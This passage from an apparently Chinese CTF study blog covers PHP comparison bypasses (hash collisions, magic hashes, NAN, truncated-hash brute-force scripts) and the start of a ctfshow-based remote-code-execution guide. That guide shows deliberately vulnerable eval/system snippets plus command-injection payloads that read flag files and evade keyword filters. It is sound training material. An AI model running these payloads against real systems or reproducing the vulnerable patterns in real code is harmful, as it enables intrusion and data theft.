class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>%<span class="number">7</span>FF%DC%<span class="number">93</span>%A6%B6%<span class="number">7</span>E%<span class="number">01</span>%<span class="number">3</span>B%<span class="number">02</span>%<span class="number">9</span>A%AA%<span class="number">1</span>D%B2V%<span class="number">0</span>BE%CAg%D6%<span class="number">88</span>%C7%F8K%<span class="number">8</span>CLy%<span class="number">1</span>F%E0%<span class="number">2</span>B%<span class="number">3</span>D%F6%<span class="number">14</span>%F8m%B1i%<span class="number">09</span>%<span class="number">01</span>%C5kE%C1S%<span class="number">0</span>A%FE%DF%B7%<span class="number">608</span>%E9rr/%E7%ADr%<span class="number">8</span>F%<span class="number">0</span>EI%<span class="number">04</span>%E0F%C20W%<span class="number">0</span>F%E9%D4%<span class="number">13</span>%<span class="number">98</span>%AB%E1.%F5%BC%<span class="number">94</span>%<span class="number">2</span>B%E35B%A4%<span class="number">80</span>-%<span class="number">98</span>%B5%D7%<span class="number">0</span>F%<span class="number">2</span>A3.%C3%<span class="number">7</span>F%AC5%<span class="number">14</span>%E7M%DC%<span class="number">0</span>F%<span class="number">2</span>C%C1%A8t%CD%<span class="number">0</span>Cx0Z%<span class="number">21</span>Vda0%<span class="number">97</span>%<span class="number">89</span>%<span class="number">60</span>k%D0%BF%<span class="number">3</span>F%<span class="number">98</span>%CD%A8%<span class="number">04</span>F%<span class="number">29</span>%A1</span><br><span class="line">b=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>sF%DC%<span class="number">91</span>f%B6%<span class="number">7</span>E%<span class="number">11</span>%<span class="number">8</span>F%<span class="number">02</span>%<span class="number">9</span>A%B6%<span class="number">21</span>%B2V%<span class="number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="number">5</span>B%A8Ly%<span class="number">03</span>%<span class="number">0</span>C%<span class="number">2</span>B%<span class="number">3</span>D%E2%<span class="number">18</span>%F8m%B3%A9%<span class="number">09</span>%<span class="number">01</span>%D5%DFE%C1O%<span class="number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="number">8</span>F%<span class="number">0</span>EE%BC%E0F%D2%<span class="number">3</span>CW%<span class="number">0</span>F%EB%<span class="number">14</span>%<span class="number">13</span>%<span class="number">98</span>%BBU.%F5%A0%A8%<span class="number">2</span>B%E31%FE%A4%<span class="number">807</span>%B8%B5%D7%<span class="number">1</span>F%<span class="number">0E3</span>.%DF%<span class="number">93</span>%AC5%<span class="number">00</span>%EBM%DC%<span class="number">0</span>D%EC%C1%A8dy%<span class="number">0</span>Cx%<span class="number">2</span>Cv%<span class="number">21</span>V%<span class="number">60</span>%DD0%<span class="number">97</span>%<span class="number">91</span>%D0k%D0%AF%<span class="number">3</span>F%<span class="number">98</span>%CD%A4%BCF%<span class="number">29</span>%B1</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h1 id="实验8"><a href="#实验8" class="headerlink" title="实验8"></a>实验8</h1><p><img src="/.com//image-20250417175035-pl0a3iz.png" alt="image"></p>
<p><img src="/.com//image-20250417175038-xd91avl.png" alt="image"></p>
<p>两个SHA1值相同而SHA256的值不同的pdf文件, <a target="_blank" rel="noopener" href="https://shattered.it/static/shattered-1.pdf">shattered-1.pdf</a>和<a target="_blank" rel="noopener" href="https://shattered.it/static/shattered-2.pdf">shattered-2.pdf</a></p>
<p>‍</p>
<h1 id="a-md5-a"><a href="#a-md5-a" class="headerlink" title="$a==md5($a)"></a>$a==md5($a)</h1><p>​<code>0e215962017</code>​的 <code>MD5</code>​ 值也是由 <code>0e</code>​ 开头，在 PHP 弱类型比较中等</p>
<p>‍</p>
<h1 id="实验9"><a href="#实验9" class="headerlink" title="实验9"></a>实验9</h1><p><img src="/.com//image-20250417175101-50g9dml.png" alt="image"></p>
<p><img src="/.com//image-20250417175105-z4p4lmw.png" alt="image"></p>
<p>‍</p>
<h1 id="NAN-和-INF"><a href="#NAN-和-INF" class="headerlink" title="NAN 和 INF"></a>NAN 和 INF</h1><p>NAN和INF，分别为非数字和无穷大，但是通过<code>var_dump</code>​查看数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串<code>NAN</code>​和字符串<code>INF</code>​使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至<code>NAN=NAN</code>​都是false，但<code>md5(&#39;NaN&#39;)==md5(&#39;NAN&#39;)</code>​为true。</p>
<p>‍</p>
<h1 id="实验10"><a href="#实验10" class="headerlink" title="实验10"></a>实验10</h1><p><img src="/.com//image-20250417175117-ndyibgq.png" alt="image"></p>
<p><img src="/.com//image-20250417175121-hgvnlqn.png" alt="image"></p>
<p><img src="/.com//image-20250417175124-dql4g5j.png" alt="image"></p>
<p><img src="/.com//image-20250417175127-ivcykbh.png" alt="image"></p>
<p>可以使用<code>NAN</code>​绕过<code>md5()</code>​和<code>sha1()</code>​</p>
<p>‍</p>
<h1 id="截断比较"><a href="#截断比较" class="headerlink" title="截断比较"></a>截断比较</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">&#x27;8ffb1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="MD5截断爆破"><a href="#MD5截断爆破" class="headerlink" title="MD5截断爆破"></a>MD5截断爆破</h2><p>给出一段<code>md5</code>​值要求找到匹配的原码。一般使用爆破脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">md5</span>(ant):  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">str</span>(ant).<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;8ffb1&#x27;</span>  <span class="comment"># 已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>  <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">findmd5</span>(sss):  <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="keyword">int</span>(key[<span class="number">0</span>])  <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="keyword">int</span>(key[<span class="number">1</span>])  <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">md5</span>(i)[<span class="number">0</span>:<span class="number">5</span>] == keymd5:  <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&#x27;&#123;result&#125; &#123;md5(result)&#125;&#x27;</span>)  <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span> = []  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">10</span>):  <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="keyword">list</span>.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">str</span>(<span class="number">10000000</span> * i) + <span class="string">&#x27;:&#x27;</span> + <span class="title function_ invoke__">str</span>(<span class="number">10000000</span> * (i + <span class="number">1</span>)))</span><br><span class="line"><span class="comment"># print(list)</span></span><br><span class="line">pool = <span class="title function_ invoke__">ThreadPool</span>()  <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="title function_ invoke__">map</span>(findmd5, <span class="keyword">list</span>)  <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.<span class="title function_ invoke__">close</span>()</span><br><span class="line">pool.<span class="title function_ invoke__">join</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417175151-7xw4wjg.png" alt="image"></p>
<p>‍</p>
<h2 id="sha256截断爆破"><a href="#sha256截断爆破" class="headerlink" title="sha256截断爆破"></a>sha256截断爆破</h2><p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sha256截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(sha256(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">s</span>):  <span class="comment"># 计算sha256字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="string">f&#x27;TQLCTF<span class="subst">&#123;s&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keysha256 = <span class="string">&#x27;5625f&#x27;</span>  <span class="comment"># 已知的sha256截断值</span></span><br><span class="line">sha256start = <span class="number">0</span>  <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">sha256length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findsha256</span>(<span class="params">sss</span>):  <span class="comment"># 输入范围 里面会进行sha256测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])  <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])  <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(sha256(i)[sha256start:sha256length])</span></span><br><span class="line">        <span class="keyword">if</span> sha256(i)[<span class="number">0</span>:<span class="number">5</span>] == keysha256:  <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;result&#125;</span> <span class="subst">&#123;sha256(result)&#125;</span>&#x27;</span>)  <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = []  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span> * i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span> * (i + <span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()  <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findsha256, <span class="built_in">list</span>)  <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417175213-75wbvwu.png" alt="image"></p>
<p>‍</p>
<h1 id="array-search和is-array"><a href="#array-search和is-array" class="headerlink" title="array_search和is_array"></a>array_search和is_array</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (!is_array($_GET[<span class="string">&#x27;test&#x27;</span>])) &#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$test = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($test); $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($test[$i] === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        echo <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i] = intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (array_search(<span class="string">&quot;admin&quot;</span>, $test) === <span class="number">0</span>) &#123;</span><br><span class="line">    echo <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;failed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417175225-hxln96p.png" alt="image"></p>
<p><img src="/.com//image-20250417175228-20igd3y.png" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" data-id="cmawcfx8x0005cg7k5um61gsa" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/RCE（远程代码执行漏洞）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="RCE（远程代码执行漏洞）"><a href="#RCE（远程代码执行漏洞）" class="headerlink" title="RCE（远程代码执行漏洞）"></a>RCE（远程代码执行漏洞）</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>RCE（Remote Code  Execution，远程代码执行）漏洞是指攻击者通过漏洞，能够在目标系统上远程执行任意代码的安全漏洞。这种漏洞通常允许攻击者在受害主机上执行恶意命令，可能导致系统被完全控制，甚至可能被用来执行系统级操作，如删除文件、窃取敏感数据、安装恶意软件等。<br>本文基于ctfshow命令执行部分，整理了RCE常见函数与命令。文章很长，建议配合右下角目录食用。</p>
<hr>
<h1 id="一-命令执行函数"><a href="#一-命令执行函数" class="headerlink" title="一. 命令执行函数"></a>一. 命令执行函数</h1><p>以下函数都应当在<code>eval</code>​中执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    </span><br><span class="line">	<span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];                </span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$c</span>);       </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="1-1-system函数命令执行"><a href="#1-1-system函数命令执行" class="headerlink" title="1.1 system函数命令执行"></a>1.1 system函数命令执行</h2><p>通过system函数执行操作系统的shell命令并输出结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">?c=system(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="1-2-passthru函数命令执行"><a href="#1-2-passthru函数命令执行" class="headerlink" title="1.2 passthru函数命令执行"></a>1.2 passthru函数命令执行</h2><p>​<code>passthru</code>​和<code>system</code>​函数差不多</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="1-3-echo-反引号命令执行"><a href="#1-3-echo-反引号命令执行" class="headerlink" title="1.3 echo+反引号命令执行"></a>1.3 echo+反引号命令执行</h2><p>用反引号执行shell命令，但是反引号执行完命令不会被输出，所以需要配合echo函数输出结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `ls`;</span><br><span class="line">?c=echo `tac flag.php`;</span><br></pre></td></tr></table></figure>

<h2 id="1-4-shell-exec函数命令执行"><a href="#1-4-shell-exec函数命令执行" class="headerlink" title="1.4 shell_exec函数命令执行"></a>1.4 shell_exec函数命令执行</h2><p>​<code>shell_exec</code>​函数和反引号类似，只执行但不返回，需要配合<code>echo</code>​命令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo shell_exec(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="二-常用命令"><a href="#二-常用命令" class="headerlink" title="二. 常用命令"></a>二. 常用命令</h1><p>以下命令应当在命令执行函数中执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    </span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    </span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-0-phpinfo-测试命令执行"><a href="#1-0-phpinfo-测试命令执行" class="headerlink" title="1.0 phpinfo()测试命令执行"></a>1.0 phpinfo()测试命令执行</h2><p>​<code>phpinfo()</code>​命令被广泛应用于是否存在RCE命令执行漏洞的测试，例如检验是否成功写入了一句话木马。更加重要的是，phpinfo中<code>disable_functions</code>​项会提供被禁用的命令，对进一步的漏洞利用具有重大帮助</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phpinfo();</span><br></pre></td></tr></table></figure>

<h2 id="1-1-ls命令目录读取"><a href="#1-1-ls命令目录读取" class="headerlink" title="1.1 ls命令目录读取"></a>1.1 ls命令目录读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-cat命令文件读取"><a href="#1-2-cat命令文件读取" class="headerlink" title="1.2 cat命令文件读取"></a>1.2 cat命令文件读取</h2><p>​<code>cat</code>​不会将结果数据到页面上，要看源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=cat flag.php</span><br><span class="line">?c=/bin/cat flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-3-tac命令文件读取"><a href="#1-3-tac命令文件读取" class="headerlink" title="1.3 tac命令文件读取"></a>1.3 tac命令文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-4-vi命令文件读取"><a href="#1-4-vi命令文件读取" class="headerlink" title="1.4 vi命令文件读取"></a>1.4 vi命令文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=vi flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-5-uniq命令文件读取"><a href="#1-5-uniq命令文件读取" class="headerlink" title="1.5 uniq命令文件读取"></a>1.5 uniq命令文件读取</h2><p>uniq函数的作用是删除文件重复行并输出剩余内容，可以用于文件读取。与cat一样，结果在源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=uniq flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-6-base64命令读取文件"><a href="#1-6-base64命令读取文件" class="headerlink" title="1.6 base64命令读取文件"></a>1.6 base64命令读取文件</h2><p>base64命令可以读取flag.php并编码后输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=base64 flag.php</span><br><span class="line">?c=/bin/base64 flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-7-grep命令文件读取"><a href="#1-7-grep命令文件读取" class="headerlink" title="1.7 grep命令文件读取"></a>1.7 grep命令文件读取</h2><p>grep用于查询文件中包含某个特定字符串的行并输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=grep <span class="string">&#x27;fla&#x27;</span> flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-8-sort命令排序输出"><a href="#1-8-sort命令排序输出" class="headerlink" title="1.8 sort命令排序输出"></a>1.8 sort命令排序输出</h2><p>sort是一个排序命令，<code>sort filename</code>​会将文件内容进行<strong>行间</strong>的排序并输出文本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=sort flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-9-mv命令文件重命名"><a href="#1-9-mv命令文件重命名" class="headerlink" title="1.9 mv命令文件重命名"></a>1.9 mv命令文件重命名</h2><p>mv函数的作用是对文件进行重命名，通过修改后缀名为txt，可以直接在网页中访问txt文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=mv f?lg.php a.txt</span><br></pre></td></tr></table></figure>

<h2 id="1-10-cp命令文件内容复制"><a href="#1-10-cp命令文件内容复制" class="headerlink" title="1.10 cp命令文件内容复制"></a>1.10 cp命令文件内容复制</h2><p>用cp命令将flag的内容复制到<code>1.txt</code>​上，然后访问<code>/1.txt</code>​文件读取，注意使用反引号进行命令执行时，还是需要使用<code>echo</code>​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=cp flag.php <span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line">?c=echo `cp flag.php <span class="number">1.</span>txt`;</span><br></pre></td></tr></table></figure>

<h1 id="三-文件名过滤"><a href="#三-文件名过滤" class="headerlink" title="三. 文件名过滤"></a>三. 文件名过滤</h1><h2 id="3-1-​通配符绕过"><a href="#3-1-​通配符绕过" class="headerlink" title="3.1 *​通配符绕过"></a>3.1 <code>*</code>​通配符绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac fl*g.php&quot;</span>);</span><br><span class="line">?c=system(<span class="string">&quot;tac fl*&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="3-2-​空字符匹配绕过"><a href="#3-2-​空字符匹配绕过" class="headerlink" title="3.2 &#39;&#39;​空字符匹配绕过"></a>3.2 <code>&#39;&#39;</code>​空字符匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac fla&#x27;&#x27;g.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>空字符串</strong>的可以用于绕过某些字符过滤，<code>fla&#39;&#39;g.php</code>​ 等价于 <code>flag.php</code>​</p>
<h2 id="3-3-​匹配绕过"><a href="#3-3-​匹配绕过" class="headerlink" title="3.3 \​匹配绕过"></a>3.3 <code>\</code>​匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac fl\ag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>​<code>\</code>​ 是 **转义字符**，通常用于转义后面的字符，在某些情况下，<code>fl\ag.php</code>​ 可能会被解释为 <code>flag.php</code>​，即通过插入转义字符来避免直接匹配敏感词或绕过过滤</p>
<h2 id="3-4-​占位绕过"><a href="#3-4-​占位绕过" class="headerlink" title="3.4 ?​占位绕过"></a>3.4 <code>?</code>​占位绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac f???????&quot;</span>)</span><br></pre></td></tr></table></figure>

